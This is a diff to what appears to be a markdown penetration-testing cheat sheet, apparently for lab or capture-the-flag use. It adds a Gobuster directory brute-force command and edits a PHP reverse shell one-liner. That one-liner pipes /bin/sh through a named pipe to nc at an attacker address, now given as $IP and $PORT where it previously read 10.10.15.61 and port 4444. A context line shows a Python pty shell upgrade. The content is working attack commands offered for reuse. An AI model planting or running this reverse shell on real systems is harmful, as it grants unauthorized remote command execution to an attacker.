@@ -8,9 +8,12 @@
 ---
 ## Gobuster
 ---
+- Gobuster Dir
+```bash
 
+gobuster dir -u http://$IP --wordlist $Wordlist
 
-
+```
 ---
 ## Hydra
 ---
@@ -45,6 +48,6 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 - PHP Reverse Shell
 ```php
 
-<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.61 4444 >/tmp/f"); ?>
+<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f"); ?>
 
 ```
